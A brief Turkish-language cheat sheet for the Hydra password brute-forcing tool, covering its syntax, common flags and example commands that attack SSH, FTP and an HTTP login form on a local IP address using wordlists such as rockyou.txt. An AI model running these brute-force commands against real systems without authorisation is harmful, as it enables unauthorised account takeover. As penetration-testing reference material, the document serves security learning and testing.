**Hydra**, ağ servislerine (SSH, FTP, HTTP vb.) karşı kaba kuvvet (brute-force) saldırıları gerçekleştirmek için kullanılan hızlı ve güçlü bir parola kırıcı araçtır.

### Temel Kullanım Sözdizimi

Bash

```
hydra -l [kullanıcı_adı] -P [parola_listesi_yolu] [hedef_ip] [servis]
```

### Sık Kullanılan Parametreler

- `-l` : Tek bir kullanıcı adı belirtir.
    
- `-L` : Kullanıcı adlarının bulunduğu bir dosya (liste) belirtir.
    
- `-p` : Tek bir parola belirtir.
    
- `-P` : Parolaların bulunduğu bir dosya (liste/wordlist) belirtir.
    
- `-s` : Servisin çalıştığı özel bir port varsa belirtmek için kullanılır (Örn: `-s 2222`).
    
- `-v` / `-V` : İşlem sürecini ve denenen kombinasyonları ayrıntılı (verbose) gösterir.
    
- `-t` : Eşzamanlı bağlantı (thread) sayısını ayarlar (Varsayılan 16'dır, hızı ayarlamak için `-t 4` gibi kullanılabilir).
    

### Örnekler

- **SSH için (Tek kullanıcı, parola listesi):**
    
    Bash
    
    ```
    hydra -l admin -P rockyou.txt 192.168.1.50 ssh
    ```
    
- **FTP için (Kullanıcı listesi, parola listesi):**
    
    Bash
    
    ```
    hydra -L users.txt -P passwords.txt 192.168.1.50 ftp
    ```
    
- **Web Giriş Formları için (HTTP-POST):**
    
    Bash
    
    ```
    hydra -l admin -P passwords.txt 192.168.1.50 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Login failed"
    ```